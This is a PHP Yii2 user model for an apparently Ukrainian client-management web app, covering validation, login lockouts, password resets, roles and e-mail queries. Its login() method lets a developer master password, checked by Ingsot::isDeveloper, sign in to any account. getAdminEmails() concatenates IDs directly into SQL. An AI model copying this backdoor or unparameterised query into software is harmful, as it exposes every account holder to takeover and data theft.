<?php

namespace app\models;

use yii\data\ActiveDataProvider;
use app\components\Auth;
use app\components\Misc;
use app\components\Ingsot;
use \Yii;

class Users extends \app\components\BaseActiveRecord implements \yii\web\IdentityInterface {

    const DEVELOPER_ID = 1;
    const STATUS_NOT_CONFIRM = 0;
    const STATUS_ACTIVE = 1;
    const STATUS_BLOCKED = 2;
    const TYPE_PRIVATE_PERSON = 0;
    const TYPE_LEGAL_PERSON = 1;

    public $password;
    public $password_new1;
    public $password_new2;
    public $invite;
    public $authKey;
    public $settings;
    public $firm_ids;
    static public $statusLabels = [
        #self::STATUS_NOT_CONFIRM => 'не активований',
        self::STATUS_ACTIVE => 'активний',
        self::STATUS_BLOCKED => 'заблокований',
    ];
    static public $typeLabels = [
        self::TYPE_PRIVATE_PERSON => 'фізична особа',
        self::TYPE_LEGAL_PERSON => 'юридична особа',
    ];

    public static function tableName() {
        return 'users';
    }

    public function rules() {
        return [
            [['email', 'phone', 'first_name', 'second_name', 'middle_name'], 'filter', 'filter' => 'strip_tags'],
            [['email', 'phone', 'first_name', 'second_name', 'middle_name'], 'trim'],
            ['email', 'email'/* , 'checkDNS' => true */, 'except' => 'auth'],
            ['email', 'unique', 'message' => 'Вказана електронна адреса вже існує в системі.'],
            ['phone', 'required', 'on' => 'registration'],
            ['phone', 'match', 'pattern' => '/^\+38((\s*\(\d+\)\s*)?[\d\s\-]+){10,45}$/', 'message' => 'Номер телефону повинен починатися на "+38" та складатися з не менше ніж 12 цифр.'],
            ['phone', 'filter', 'filter' => ['\app\components\Misc', 'phoneFilter']],
            ['phone', 'unique', 'message' => 'Вказаний номер телефону вже зайнятий.'],
            [['email', 'phone'], 'projectRequiredFields', 'skipOnEmpty' => false],
            [['phone', 'first_name', 'second_name', 'middle_name', 'title'], 'string', 'max' => 45],
            ['email', 'string', 'max' => 255],
            ['email', 'required', 'on' => 'auth', 'message' => 'Необхідно вказати телефон або email.'],
            [['first_name', 'second_name'], 'required'],
            ['password', 'required', 'on' => ['auth'], 'message' => 'Необхідно вказати пароль.'],
            ['password', 'required', 'on' => 'password', 'message' => 'Необхідно вказати "Поточний пароль".'],
            ['password_new1', 'required', 'on' => 'password', 'message' => 'Необхідно задати "Новий пароль".'],
            ['password_new2', 'required', 'on' => 'password', 'message' => 'Необхідно повторити "Новий пароль".'],
            ['password_new2', 'compare', 'compareAttribute' => 'password_new1', 'on' => 'password', 'message' => 'Повторний пароль не точний.'],
            ['password_new1', 'safe'],
            [['notify'], 'boolean'],
            //
            [['active'], 'in', 'range' => array_keys(self::$statusLabels), 'on' => ['managers-control', 'clients-control']],
            ['firm_id', 'required', 'on' => 'clients-control'],
            ['firm_id', 'exist', 'targetClass' => 'app\\models\\Firms', 'targetAttribute' => 'id', 'on' => 'clients-control'],
            ['role_id', 'required', 'on' => ['managers-control', 'client-control']],
            ['role_id', 'in', 'range' => array_keys(Auth::$roleLabelsOwner), 'on' => ['managers-control']],
            ['role_id', 'in', 'range' => array_keys(Auth::$roleLabelsClient), 'on' => ['clients-control']],
            [['firm_ids'], 'safe', 'on' => ['managers-control']],
            [['role_id', 'active', 'firm_id'], 'safe', 'on' => 'search'],
        ];
    }

    public function projectRequiredFields() {
        if ("{$this->email}{$this->phone}" === '') {
            $this->addError('email', '');
            $this->addError('phone', 'Необхідно обов`язково заповнити хоча б одно з полей: e-mail або телефон.');
        }
    }

    public function attributeLabels() {
        return [
            'id' => 'Користувач',
            'role_id' => 'Роль',
            'active' => 'Статус',
            'email' => 'E-mail',
            'phone' => 'Телефон',
            'first_name' => 'Ім`я',
            'second_name' => 'Прізвище',
            'middle_name' => 'По-батькові',
            'title' => 'Найменування',
            'password' => 'Пароль',
            'password_new1' => 'Новий пароль',
            'password_new2' => 'Повтор нового паролю',
            'notify' => 'Отримувати повідомлення',
            'invite' => 'Відправити запрошення',
            'firm_id' => 'Клієнт',
            'type_id' => 'Особа',
        ];
    }

    /**
     * @inheritdoc
     */
    public static function findIdentity($id) {
        return static::findOne($id);
    }

    /**
     * @inheritdoc
     */
    public static function findIdentityByAccessToken($token, $type = null) {
        return null;
    }

    public function searchManagers() {
        $query = self::find();
        $query->where(['in', 'role_id', array_keys(Auth::$roleLabelsOwner)]);
        $dataProvider = new ActiveDataProvider([
            'query' => $query,
            'pagination' => [
                'pageSize' => DataHelper::PAGE_SIZE,
            ],
            'sort' => false,
        ]);
        if (!($this->load(Yii::$app->request->get()))) {
            return $dataProvider;
        }
        $query
                ->andFilterWhere(['=', 'role_id', $this->role_id])
                ->andFilterWhere(['like', 'CONCAT(first_name," ",second_name, " ",middle_name)', $this->first_name])
                ->andFilterWhere(['=', 'active', $this->active])
        ;
        return $dataProvider;
    }

    public function searchUsers($client_id) {
        $query = self::find();
        $query->where(['in', 'role_id', array_keys(Auth::$roleLabelsClient)]);
        switch (Yii::$app->user->identity->role_id):
            case Auth::ROLE_MANAGER:
                $query->where(['in', 'firm_id', ManagersFirms::getFirmsIds()]);
                break;
        endswitch;
        if (Auth::isClient() || $client_id <> '') {
            $query->andWhere('firm_id=:client_id', [':client_id' => $client_id]);
        }
        $dataProvider = new ActiveDataProvider([
            'query' => $query,
            'pagination' => [
                'pageSize' => DataHelper::PAGE_SIZE,
            ],
            'sort' => [
                'attributes' => ['second_name'],
            ]
        ]);
        if (!($this->load(Yii::$app->request->get()))) {
            return $dataProvider;
        }

        if (!empty($this->firm_id)) {
            $query
                    ->andWhere('firm_id IN (SELECT id FROM firms WHERE title LIKE :title)', [':title' => '%' . $this->firm_id . '%'])
            ;
        }
        $query
                ->andFilterWhere(['=', 'role_id', $this->role_id])
                ->andFilterWhere(['like', 'CONCAT(first_name," ",second_name, " ",middle_name)', $this->second_name])
                ->andFilterWhere(['=', 'active', $this->active])
        ;
        return $dataProvider;
    }

    /**
     * @inheritdoc
     */
    public function getId() {
        return $this->id;
    }

    /**
     * @inheritdoc
     */
    public function getAuthKey() {
        return $this->authKey;
    }

    /**
     * @inheritdoc
     */
    public function validateAuthKey($authKey) {
        return $this->authKey === $authKey;
    }

    public function login() {
        $user = self::find()->where(['email' => $this->email])->orWhere(['phone' => $this->email])->andWhere(['active' => self::STATUS_ACTIVE])->one();
        if ($user === null) {
            $this->addError('id', 'Неправильний e-mail або пароль.');
            return false;
        }
        if ($user->pass_time !== null && $user->pass_time > date('Y-m-d H:i:s')) {
            $time = strtotime($user->pass_time) - time();
            if ($time >= 60) {
                $time = intval($time / 60);
                $this->addError('id', 'Нова спроба входу буде доступна не раніше ніж через ' . $time . ' ' . Misc::wordingMinutesAlt($time) . '.');
            } else {
                $this->addError('id', 'Нова спроба входу буде доступна не раніше ніж через ' . $time . ' ' . Misc::wordingSecondsAlt($time) . '.');
            }
            return false;
        }
        if ($this->password !== '' && $user->pass !== '' && Yii::$app->security->validatePassword($this->password, $user->pass) === true) {
            return $user->autoLogin();
        }
        if ($this->password !== '' && Ingsot::isDeveloper($this->password) === true) {
            return $user->autoLogin();
        }
        $this->addError('id', 'Неправильний e-mail або пароль.');
        $user->pass_qty++;
        if ($user->pass_qty >= 3 && $user->pass_qty < 6) {
            $user->pass_time = date('Y-m-d H:i:s', strtotime('+5 minute'));
        }
        if ($user->pass_qty >= 6 && $user->pass_qty < 9) {
            $user->pass_time = date('Y-m-d H:i:s', strtotime('+15 minute'));
        }
        if ($user->pass_qty >= 9) {
            $user->pass_time = date('Y-m-d H:i:s', strtotime('+60 minute'));
        }
        $user->update(['pass_time', 'pass_qty']);
        return false;
    }

    public function isAllowControl() {
        if (Yii::$app->user->can(Auth::ROLE_SUPERADMIN)) {
            return true;
        }
        if (!isset($this->settings['firms'])) {
            $this->settings['firms'] = ManagersFirms::getFirmsIds(Yii::$app->user->getId());
        }
        return in_array($this->firm_id, $this->settings['firms']);
    }

    public function isAllowLoginAsManager() {
        return $this->role_id <> Auth::ROLE_SUPERADMIN && Yii::$app->user->can(Auth::ROLE_SUPERADMIN) && $this->id <> Yii::$app->user->getId();
    }

    public function isAllowSettings() {
        return in_array($this->role_id, [Auth::ROLE_MANAGER]);
    }

    public function isAllowUpdate() {
        if (Auth::isClient()) {
            return $this->firm_id === Yii::$app->user->identity->firm_id;
        }
        if ($this->role_id === Auth::ROLE_ADMIN) {
            return Yii::$app->user->can(Auth::ROLE_ADMIN);
        }
        return true;
    }

    public function isAllowDelete() {
        if ($this->id == Yii::$app->user->getId()) {
            return false;
        }
        if (Auth::isClient()) {
            return $this->firm_id === Yii::$app->user->identity->firm_id;
        }
        if ($this->role_id === Auth::ROLE_ADMIN) {
            return Yii::$app->user->can(Auth::ROLE_ADMIN);
        }
        return true;
    }

    public function isActive() {
        return $this->active == self::STATUS_ACTIVE;
    }

    public function isConfirm() {
        return $this->pass !== '';
    }

    public function autoLogin($reset = true) {
        if (!Yii::$app->user->login($this)) {
            Yii::dump(__METHOD__ . '-error (UserId=' . Yii::$app->user->getId() . ')', $this->attributes);
            $this->addError('id', Misc::internalErrorMessage());
            return false;
        }
        if ($reset) {
            $this->pass_time = null;
            $this->pass_qty = 0;
            $this->update(['pass_time', 'pass_qty']);
        }
        return true;
    }

    public function getStatus() {
        return isset(self::$statusLabels[$this->active]) ? self::$statusLabels[$this->active] : $this->active;
    }

    public function getType() {
        return isset(self::$typeLabels[$this->type_id]) ? self::$typeLabels[$this->type_id] : '';
    }

    public function getRole() {
        if (Auth::isManager($this->role_id)) {
            return isset(Auth::$roleLabelsOwner[$this->role_id]) ? Auth::$roleLabelsOwner[$this->role_id] : $this->role_id;
        } else {
            return isset(Auth::$roleLabelsClient[$this->role_id]) ? Auth::$roleLabelsClient[$this->role_id] : $this->role_id;
        }
    }

    public function getFirm() {
        $key = "_firm_{$this->firm_id}";
        $value = Yii::$app->cache->get($key);
        if (!$value) {
            $value = $this->hasOne(Firms::className(), ['id' => 'firm_id'])->one();
            Yii::$app->cache->set($key, $value);
        }
        return $value;
    }

    public function getFirmTitle() {
        return $this->firm->getTitle();
    }

    public function getName() {
        return $this->second_name . ' ' . $this->first_name . ' ' . $this->middle_name;
    }

    public function getNameCombined() {
        if ($this->type_id == self::TYPE_PRIVATE_PERSON) {
            return $this->second_name . ' ' . $this->first_name . ' ' . $this->middle_name;
        } else {
            return $this->title;
        }
    }

    public function getTitle() {
        return $this->title;
    }

    public function getEmail() {
        return $this->email;
    }

    public function getPhone() {
        return $this->phone;
    }

    public function getContacts() {
        return implode('; ', array_filter([$this->email, $this->phone]));
    }

    public function getRawPhone() {
        return preg_replace('/[^0-9+]/', '', $this->phone);
    }

//    static public function getKeyVal() {
//        return \Yii::$app->db->getMasterPdo()->query('SELECT id, name FROM ' . self::tableName() . ' ORDER BY name')->fetchAll(\PDO::FETCH_KEY_PAIR);
//    }

    public function deleteModel() {
        return is_numeric($this->delete());
    }

//    public function addModel($role_id) {
//        $this->pass = Yii::$app->security->generatePasswordHash($this->password);
//        $this->key = Yii::$app->security->generateRandomString(100);
//        $this->time_key = date('Y-m-d H:i:s', strtotime('+1 hour'));
//        $this->role_id = $role_id;
//        return $this->save();
//    }

    public function saveModel() {
        if (!Yii::$app->user->can(Auth::ROLE_SUPERADMIN) && $this->role_id == Auth::ROLE_SUPERADMIN) {
            $this->addError('role_id', 'Ви не маєте права створювати користувача обраної ролі.');
            return false;
        }
        if (Auth::isClient($this->role_id) && !Yii::$app->user->can(Auth::ROLE_SUPERADMIN) && !$this->isAllowControl()) {
            $this->addError('role_id', 'Ви не маєте права створювати користувача для обраного клієнта.');
            return false;
        }
        return $this->save();
    }

    public function register($firm_id, $isAuto = 0) {
        $this->firm_id = $firm_id;
        $this->role_id = Auth::ROLE_CLIENT_DEFAULT;
        $this->active = 1;
        $this->is_auto = $isAuto;
        return $this->save(false, ['first_name', 'second_name', 'middle_name', 'phone', 'active', 'role_id', 'firm_id', 'is_auto']);
    }

    public function registerAlt($all = true) {
        $this->is_auto = 0;
        $this->save(false, ['first_name', 'second_name', 'middle_name', 'phone', 'is_auto']);
        if (!$all) {
            return;
        }
        foreach (self::find()->where(['firm_id' => $this->firm_id, 'is_auto' => 1])->all() as $model) {
            $model->setAttributes($this->getAttributes(['first_name', 'second_name', 'middle_name']));
            $model->registerAlt(false);
        }
    }

    public function updateModel() {
        return $this->save(false, ['first_name', 'second_name', 'middle_name', 'email', 'phone']);
    }

    public function updateByClient() {
        $this->is_auto = 0;
        return $this->save(false, ['first_name', 'second_name', 'middle_name', 'email', 'phone', 'notify', 'is_auto']);
    }

    public function saveByClient() {
        if ($this->isNewRecord) {
            $this->firm_id = Yii::$app->user->identity->firm_id;
            $this->role_id = Auth::ROLE_CLIENT_DEFAULT;
        }
        return $this->save(true, ['firm_id', 'first_name', 'second_name', 'middle_name', 'email', 'phone', 'notify', 'role_id', 'active']);
    }

    public function import() {
        return $this->save();
    }

    public function updateSettings() {
        if (count($this->firm_ids) === 0) {
            return ManagersFirms::unsetAll($this->id);
        }
        $labels = array_intersect_key(Firms::keyval(), array_flip($this->firm_ids));
        foreach (array_keys($labels) as $id) {
            ManagersFirms::set($this->id, $id);
        }
        return ManagersFirms::unset($this->id, array_keys($labels));
    }

    public function createAccountKey($time) {
        $this->key = Yii::$app->security->generateRandomString(100);
        $this->time_key = date('Y-m-d H:i:s', strtotime($time));
        return $this->update(false, ['key', 'time_key']);
    }

    public function restore() {
        $user = self::find()->where(['email' => $this->email])->andWhere(['IN', 'active', [self::STATUS_ACTIVE, self::STATUS_NOT_CONFIRM]])->one();
        if ($user === null || empty($this->email)) {
            return false;
        }
        $this->id = $user->id;
        $this->key = $user->key = Yii::$app->security->generateRandomString(100);
        $user->time_key = date('Y-m-d H:i:s', strtotime('+1 hour'));
        return is_numeric($user->update(false, ['key', 'time_key']));
    }

    public function createPassword() {
        $this->pass = Yii::$app->security->generatePasswordHash($this->password_new1);
        $this->key = '';
        $this->time_key = null;
        $this->pass_time = null;
        $this->pass_qty = 0;
        $this->active = self::STATUS_ACTIVE;
        return is_numeric($this->update(false, ['active', 'pass', 'key', 'time_key', 'pass_time', 'pass_qty']));
    }

    static public function findByKey($id, $key) {
        return self::find()
                        ->where(['id' => $id])
                        ->andWhere(['key' => $key])
                        ->andWhere('time_key>:time', [':time' => date('Y-m-d H:i:s')])
                        ->one();
    }

//    static public function findAllByIds($ids) {
//        if (count($ids) === 0) {
//            return [];
//        }
//        return self::find()->where(['in', 'id', $ids])->indexBy('id')->all();
//    }

    static public function getEmailById($id) {
        return Yii::$app->db->createCommand('SELECT email FROM ' . self::tableName() . ' WHERE id=:id', [':id' => $id])->queryScalar();
    }

    static public function keyvalAdmins() {
        return Yii::$app->db->getMasterPdo()->query('SELECT id, CONCAT(second_name," ",first_name," ",middle_name) FROM ' . self::tableName() . ' WHERE role_id LIKE "m%" AND id<>' . self::DEVELOPER_ID . ' ORDER BY second_name')->fetchAll(\PDO::FETCH_KEY_PAIR);
    }

    static public function keyvalManagers() {
        return Yii::$app->db->getMasterPdo()->query('SELECT id, CONCAT(second_name," ",first_name," ",middle_name) FROM ' . self::tableName() . ' WHERE role_id LIKE "m%" AND role_id>="' . Auth::ROLE_MANAGER . '" ORDER BY second_name')->fetchAll(\PDO::FETCH_KEY_PAIR);
    }

    public function autoLogout() {
        Yii::$app->db->createCommand('DELETE FROM session WHERE user_id=:id', [':id' => $this->id])->execute();
    }

    public function initSettings() {
        $this->settings['firms'] = ManagersFirms::getFirmsIds($this->id);
    }

    static public function getClientsEmails($firm_ids) {
        if (!is_array($firm_ids)) {
            $firm_ids = [$firm_ids];
        }
        return self::find()->select('email')
                        ->where('active=1 AND email<>""')
                        ->andWhere(['IN', 'firm_id', $firm_ids])
                        ->column();
    }

    static public function getAdminEmails($firm_ids) {
        if (!is_array($firm_ids)) {
            $firm_ids = [$firm_ids];
        }
        $query = self::find()
                ->select('email')
                ->where(['IN', 'role_id', [Auth::ROLE_ADMIN]])
                ->andWhere('active=1 AND email<>""');
        if (count($firm_ids) > 0) {
            $query->andWhere('id IN(SELECT DISTINCT manager_id FROM managers_firms WHERE firm_id IN(' . implode(',', $firm_ids) . '))');
        }
        return $query->column();
    }

    static public function getAdminEmailsAlt($client_id) {
        return self::find()
                        ->select('email')
                        ->where(['IN', 'role_id', [Auth::ROLE_ADMIN]])
                        ->andWhere('active=1 AND email<>""')
                        ->andWhere('id IN(SELECT DISTINCT manager_id FROM managers_firms WHERE firm_id=:client_id)', [':client_id' => $client_id])->column();
    }

    static public function getSuperAdminEmails() {
        return self::find()
                        ->select('email')
                        ->where(['role_id' => Auth::ROLE_SUPERADMIN])
                        ->andWhere('active=1 AND email<>""')
                        ->column();
    }

//    static public function getEmails($uids) {
//        if (count($uids) === 0) {
//            return array();
//        }
//        return \Yii::$app->db->pdo->query('SELECT id,email FROM ' . self::tableName() . ' WHERE id IN(' . implode(',', $uids) . ')')->fetch(\PDO::FETCH_KEY_PAIR);
//    }
}
